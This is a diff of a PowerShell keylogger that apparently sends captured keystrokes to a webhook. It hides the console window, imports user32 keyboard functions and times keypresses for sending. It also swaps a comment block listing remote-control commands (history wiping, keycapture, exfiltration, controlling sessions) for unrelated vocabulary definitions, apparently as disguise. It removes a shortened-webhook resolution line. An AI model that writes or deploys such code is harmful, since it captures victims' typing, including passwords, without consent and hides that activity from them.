@@ -1,24 +1,35 @@
 
 # =====================================================================================================================================================
 <#
-    ExtraInfo: Get a list of further info and command examples
+Ablaze – On fire; brightly burning with intensity.
 
-    Cleanup: Wipe history (run prompt, powershell, recycle bin, Temp)
+Banter – Playful, teasing talk between close friends.
 
-    Kill: Stop a running module (eg. Keycapture / Exfiltrate)
+Crisp – Firm, dry, and easily breakable texture.
 
-    ControlAll: Control all waiting sessions simultaneously
+Dapper – Stylish, neat man with elegant appearance.
 
-    ShowAll: Control all waiting sessions simultaneously
+Elicit – Draw out a response or reaction.
 
-    Pause: Pause the current authenticated session
+Fathom – Understand something deeply, often abstractly.
 
-    Close: Close this session
+Glimpse – Quick, brief look without full details.
+
+Havoc – Widespread destruction; total chaos and disorder.
+
+Imbue – Fill or inspire with certain feelings.
+
+Jovial – Cheerful, friendly, full of good humor.
+
+Keen – Sharp, eager, or intellectually perceptive mind.
+
+Lurk – Remain hidden, waiting to spring forth.
+
+Mirth – Amusement expressed through laughter or cheerfulness.
+
+Nimble – Quick and light in movement or action.
 
 #>
-# =====================================================================================================================================================
-# shortened URL Detection
-if ($dc.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $dc = (irm $dc).url}
 
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
 $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
@@ -33,6 +44,9 @@ else{
     $Type::ShowWindowAsync($hwnd, 0)
 }
 
+$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
+$KeypressThreshold = [TimeSpan]::FromSeconds(10)
+
 # Import DLL Definitions for keyboard inputs
 $API = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
@@ -46,9 +60,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 '@
 $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
 
-# Add stopwatch for intellegent sending
-$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
-$KeypressThreshold = [TimeSpan]::FromSeconds(10)
 
 # Start a continuous loop
 While ($true){
